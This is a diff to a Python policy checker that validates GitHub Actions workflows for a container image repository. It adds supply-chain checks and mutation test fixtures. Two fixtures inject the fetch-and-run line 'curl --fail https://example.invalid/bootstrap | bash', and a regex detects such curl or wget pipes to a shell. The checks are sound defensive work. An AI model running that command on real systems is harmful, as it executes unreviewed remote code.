@@ -5226,6 +5226,7 @@ def check_supply_chain_workflows() -> None:
         ".github/workflows/build.yaml",
         ".github/workflows/nightly.yaml",
         ".github/workflows/publish-image.yaml",
+        ".github/workflows/publish-python.yaml",
         ".github/workflows/python-ci.yaml",
         ".github/workflows/rpm-lock-refresh.yaml",
         *SUPPLY_CHAIN_WORKFLOWS,
@@ -6055,6 +6056,8 @@ PYTHON_EVIDENCE_UPLOAD_PATHS = (
     "dist/python-evidence/base-python.${{ matrix.arch }}.secret-scan.json",
 )
 PYTHON_CI_JOB_IDS = ("changes", "self-tests", "build", "reproducibility", "python-required")
+WORKFLOW_SCANNER_DB_MAX_AGE_DAYS = 7
+WORKFLOW_TIMEOUT_MINUTES_MAXIMUM = 360
 PYTHON_CI_TRIGGER_BLOCK = (
     "on:\n  pull_request:\n    branches: [main]\n  push:\n    branches: [main]\n  workflow_dispatch:\n\n"
 )
@@ -6140,6 +6143,96 @@ def _workflow_run_scalar(step_block: str) -> bytes:
             return b""
     scalar = "".join(scalar_lines)
     return (scalar.rstrip("\n") + "\n").encode() if scalar else b""
+
+
+def _workflow_run_scalars(workflow: str) -> tuple[str, ...]:
+    lines = workflow.splitlines()
+    scalars: list[str] = []
+    index = 0
+    while index < len(lines):
+        match = re.match(r"^(?P<indent> +)(?:- )?run:\s*(?P<value>.*)$", lines[index])
+        if match is None:
+            index += 1
+            continue
+        indent = len(match.group("indent"))
+        value = match.group("value").strip()
+        if re.fullmatch(r"[|>][+-]?", value) is None:
+            if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
+                value = value[1:-1]
+            scalars.append(value)
+            index += 1
+            continue
+        index += 1
+        body: list[str] = []
+        while index < len(lines):
+            line = lines[index]
+            if line and len(line) - len(line.lstrip(" ")) <= indent:
+                break
+            body.append(line[indent + 2 :] if line else "")
+            index += 1
+        scalars.append(" ".join(body) if value.startswith(">") else "\n".join(body))
+    return tuple(scalars)
+
+
+def _workflow_scanner_db_age_invalid(workflow: str) -> bool:
+    matches = re.findall(r"^  SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
+    if len(matches) != 1:
+        return True
+    value = matches[0]
+    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
+        value = value[1:-1]
+    if re.fullmatch(r"[0-9]+", value) is None:
+        return True
+    age_days = int(value)
+    return not 0 < age_days <= WORKFLOW_SCANNER_DB_MAX_AGE_DAYS
+
+
+def _workflow_checkout_sha_consistency_invalid(workflow: str, relative_path: str) -> bool:
+    workflow_directory = ROOT / ".github/workflows"
+    checkout_refs: list[str] = []
+    for path in sorted(workflow_directory.iterdir()):
+        if not path.is_file() or path.suffix not in {".yaml", ".yml"}:
+            continue
+        candidate_path = path.relative_to(ROOT).as_posix()
+        candidate = workflow if candidate_path == relative_path else path.read_text(encoding="utf-8")
+        checkout_refs.extend(ref for action, ref in WORKFLOW_USES.findall(candidate) if action == "actions/checkout")
+    return (
+        not checkout_refs or any(SHA40.fullmatch(ref) is None for ref in checkout_refs) or len(set(checkout_refs)) != 1
+    )
+
+
+def _workflow_fetched_output_shell_pipeline_invalid(workflow: str) -> bool:
+    direct_pipeline = re.compile(
+        r"(?:^|[;&(|{])\s*(?:curl|wget)\b[^\n|;]*\|\s*(?:/usr/bin/|/bin/)?(?:sh|bash)\b",
+        re.MULTILINE,
+    )
+    for scalar in _workflow_run_scalars(workflow):
+        without_continuations = re.sub(r"\\\r?\n[ \t]*", " ", scalar)
+        if direct_pipeline.search(without_continuations) is not None:
+            return True
+    return False
+
+
+def _workflow_declared_runner_timeout_invalid(workflow: str, job_ids: tuple[str, ...]) -> bool:
+    for job_id in job_ids:
+        job = _workflow_job_block(workflow, job_id)
+        if not job:
+            continue
+        values = re.findall(r"^    timeout-minutes:\s*(.*?)\s*$", job, re.MULTILINE)
+        if len(values) != 1 or re.fullmatch(r"[1-9][0-9]*", values[0]) is None:
+            return True
+        if int(values[0]) > WORKFLOW_TIMEOUT_MINUTES_MAXIMUM:
+            return True
+    return False
+
+
+def _workflow_checkout_sha_mutation(workflow: str) -> str:
+    return re.sub(
+        r"(uses: actions/checkout@)[0-9a-f]{40}",
+        lambda match: match.group(1) + ("0" * 40),
+        workflow,
+        count=1,
+    )
 
 
 def _python_ci_permission_sites(workflow: str) -> list[tuple[str, tuple[tuple[str, str], ...]]]:
@@ -6378,6 +6471,26 @@ def python_ci_preflight_errors(workflow: str) -> list[str]:
     reject(step_continue_invalid, "python CI steps must not use continue-on-error")
     # CHECK: python-ci-job-continue
     reject(job_continue_invalid, "python CI jobs must not use continue-on-error")
+    # CHECK: python-ci-scanner-db-age
+    reject(
+        _workflow_scanner_db_age_invalid(workflow),
+        "python CI scanner DB maximum age must be a positive integer no greater than 7 days",
+    )
+    # CHECK: python-ci-checkout-consistency
+    reject(
+        _workflow_checkout_sha_consistency_invalid(workflow, ".github/workflows/python-ci.yaml"),
+        "python CI actions/checkout SHA must preserve repository-wide checkout SHA consistency",
+    )
+    # CHECK: python-ci-fetched-shell-pipeline
+    reject(
+        _workflow_fetched_output_shell_pipeline_invalid(workflow),
+        "python CI run scalars must not pipe curl or wget output directly to sh or bash",
+    )
+    # CHECK: python-ci-runner-timeout
+    reject(
+        _workflow_declared_runner_timeout_invalid(workflow, PYTHON_CI_JOB_IDS),
+        "python CI declared runner-backed jobs must each have exactly one literal timeout-minutes from 1 to 360",
+    )
     return errors
 
 
@@ -6704,6 +6817,35 @@ def _python_ci_semantic_fixtures(workflow: str) -> list[tuple[str, str, str]]:
             ),
             "python CI jobs must not use continue-on-error",
         ),
+        (
+            "scanner DB maximum age exceeds policy",
+            workflow.replace('  SCANNER_DB_MAX_AGE_DAYS: "7"\n', '  SCANNER_DB_MAX_AGE_DAYS: "365"\n', 1),
+            "python CI scanner DB maximum age must be a positive integer no greater than 7 days",
+        ),
+        (
+            "checkout SHA consistency changed",
+            _workflow_checkout_sha_mutation(workflow),
+            "python CI actions/checkout SHA must preserve repository-wide checkout SHA consistency",
+        ),
+        (
+            "network fetch piped to shell",
+            workflow.replace(
+                "      - name: Run python tool self-tests and lock validation\n"
+                "        run: |\n"
+                "          set -euo pipefail\n",
+                "      - name: Run python tool self-tests and lock validation\n"
+                "        run: |\n"
+                "          set -euo pipefail\n"
+                "          curl --fail https://example.invalid/bootstrap | bash\n",
+                1,
+            ),
+            "python CI run scalars must not pipe curl or wget output directly to sh or bash",
+        ),
+        (
+            "declared runner timeout removed",
+            workflow.replace("    timeout-minutes: 10\n", "", 1),
+            "python CI declared runner-backed jobs must each have exactly one literal timeout-minutes from 1 to 360",
+        ),
     ]
     for label, mutated, _ in fixtures:
         require(mutated != workflow, f"python CI semantic mutation is a no-op: {label}")
@@ -6878,6 +7020,17 @@ PUBLISH_PYTHON_JOB_IDS = [
     "apply-aliases",
     "anonymous-verification",
 ]
+PUBLISH_PYTHON_RUNNER_JOB_IDS = (
+    "release-preflight",
+    "slsa-generator-tag-integrity",
+    "publish-scope",
+    "publish",
+    "gate-evidence",
+    "sign-attest",
+    "rekor-rollup",
+    "apply-aliases",
+    "anonymous-verification",
+)
 PUBLISH_PYTHON_REPOSITORY_GUARD = "github.repository == 'NWarila/ubi9-base-micro'"
 
 
@@ -6906,6 +7059,9 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
     aliases = _workflow_job_block(workflow, "apply-aliases")
     anonymous = _workflow_job_block(workflow, "anonymous-verification")
     preflight = _workflow_job_block(workflow, "release-preflight")
+    preflight_buildx_step = _workflow_named_step(preflight, "Set up Docker Buildx")
+    preflight_execution_step = _workflow_named_step(preflight, "Execute release preflight")
+    preflight_execution = _workflow_run_scalar(preflight_execution_step).decode(errors="replace")
     build_step = _workflow_named_step(publish, "Build and push unaliased candidate")
     gate_cosign_step = _workflow_named_step(gate_evidence, "Install Cosign")
     evidence_types = ("spdx", "cyclonedx", "openvex", "nist_800_190", "stig_arf")
@@ -7174,6 +7330,34 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
         and "refs/tags/v*" not in workflow
         and "refs/tags/v" not in workflow
     )
+    buildkit_host_network_invalid = not (
+        preflight_buildx_step.count("            network=host\n") == 1
+        and preflight_execution.count(
+            'builder_network="$(docker inspect --format \'{{.HostConfig.NetworkMode}}\' "${builder_container}")"'
+        )
+        == 1
+        and preflight_execution.count(
+            'if [[ "${builder_network}" != "host" ]]; then\n'
+            "  printf 'BuildKit builder NetworkMode must be host, observed %s\\n' \"${builder_network}\" >&2\n"
+            "  exit 1\n"
+            "fi\n"
+            "printf 'BuildKit builder network assertion passed: NetworkMode=%s\\n' \"${builder_network}\"\n"
+        )
+        == 1
+    )
+    docker_floor_matches = re.findall(
+        r"^\s*if version < \((\d+),\s*(\d+),\s*(\d+)\):\s*\n"
+        r"\s+raise SystemExit\(f\"Docker server must be at least [^\"]+\"\)$",
+        preflight_execution,
+        re.MULTILINE,
+    )
+    docker_server_floor_invalid = not (
+        preflight_execution.count("docker_server_version=\"$(docker version --format '{{.Server.Version}}')\"") == 1
+        and preflight_execution.count("python3.12 - \"${docker_server_version}\" <<'PY'") == 1
+        and len(docker_floor_matches) == 1
+        and tuple(int(component) for component in docker_floor_matches[0]) >= (28, 0, 0)
+    )
+    preflight_secret_surface_invalid = re.search(r"\$\{\{\s*secrets\.", preflight) is not None
 
     # CHECK: python-publish-trigger
     reject(trigger_invalid, "Python publish trigger contract mismatch")
@@ -7229,6 +7413,38 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
     reject(pre_alias_invalid, "Python preflight consumer-alias absence proof mismatch")
     # CHECK: python-publish-tag-isolation
     reject(tag_isolation_invalid, "Python and micro release tag namespaces overlap")
+    # CHECK: python-publish-scanner-db-age
+    reject(
+        _workflow_scanner_db_age_invalid(workflow),
+        "Python publish scanner DB maximum age must be a positive integer no greater than 7 days",
+    )
+    # CHECK: python-publish-checkout-consistency
+    reject(
+        _workflow_checkout_sha_consistency_invalid(workflow, PUBLISH_PYTHON_WORKFLOW),
+        "Python publish actions/checkout SHA must preserve repository-wide checkout SHA consistency",
+    )
+    # CHECK: python-publish-fetched-shell-pipeline
+    reject(
+        _workflow_fetched_output_shell_pipeline_invalid(workflow),
+        "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
+    )
+    # CHECK: python-publish-buildkit-host-network
+    reject(
+        buildkit_host_network_invalid,
+        "Python release preflight must configure and verify BuildKit host networking",
+    )
+    # CHECK: python-publish-docker-server-floor
+    reject(docker_server_floor_invalid, "Python release preflight Docker server floor must be at least 28.0.0")
+    # CHECK: python-publish-runner-timeout
+    reject(
+        _workflow_declared_runner_timeout_invalid(workflow, PUBLISH_PYTHON_RUNNER_JOB_IDS),
+        "Python publish declared runner-backed jobs must each have exactly one literal timeout-minutes from 1 to 360",
+    )
+    # CHECK: python-publish-preflight-secret-surface
+    reject(
+        preflight_secret_surface_invalid,
+        "Python release preflight must not reference secrets.*",
+    )
     return errors
 
 
@@ -7421,6 +7637,63 @@ def _publish_python_workflow_fixtures(workflow: str) -> list[tuple[str, str, str
         ),
         changed(
             "tag-isolation", "refs/tags/python/v", "refs/tags/v", "Python and micro release tag namespaces overlap", 1
+        ),
+        changed(
+            "scanner-db-maximum-age",
+            '  SCANNER_DB_MAX_AGE_DAYS: "7"\n',
+            '  SCANNER_DB_MAX_AGE_DAYS: "365"\n',
+            "Python publish scanner DB maximum age must be a positive integer no greater than 7 days",
+        ),
+        (
+            "checkout-sha-consistency",
+            _workflow_checkout_sha_mutation(workflow),
+            "Python publish actions/checkout SHA must preserve repository-wide checkout SHA consistency",
+        ),
+        changed(
+            "network-fetch-piped-to-shell",
+            "      - name: Run runtime and evidence gates\n"
+            "        env:\n"
+            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
+            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
+            "          CONTAINER_ENGINE: docker\n"
+            "        run: |\n"
+            "          set -euo pipefail\n",
+            "      - name: Run runtime and evidence gates\n"
+            "        env:\n"
+            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
+            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
+            "          CONTAINER_ENGINE: docker\n"
+            "        run: |\n"
+            "          set -euo pipefail\n"
+            "          curl --fail https://example.invalid/bootstrap | bash\n",
+            "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
+        ),
+        changed(
+            "buildkit-host-network",
+            "            network=host\n",
+            "            network=bridge\n",
+            "Python release preflight must configure and verify BuildKit host networking",
+        ),
+        changed(
+            "docker-server-floor",
+            "          if version < (28, 0, 0):\n",
+            "          if version < (1, 0, 0):\n",
+            "Python release preflight Docker server floor must be at least 28.0.0",
+        ),
+        changed(
+            "declared-runner-timeout",
+            "    timeout-minutes: 120\n",
+            "",
+            "Python publish declared runner-backed jobs must each have exactly one literal "
+            "timeout-minutes from 1 to 360",
+        ),
+        changed(
+            "preflight-secret-surface",
+            "        env:\n          BUILDER_NAME: ${{ steps.buildx.outputs.name }}\n",
+            "        env:\n"
+            "          BUILDER_NAME: ${{ steps.buildx.outputs.name }}\n"
+            "          REVIEW_PROBE: ${{ secrets.REVIEW_PROBE }}\n",
+            "Python release preflight must not reference secrets.*",
         ),
     ]
 
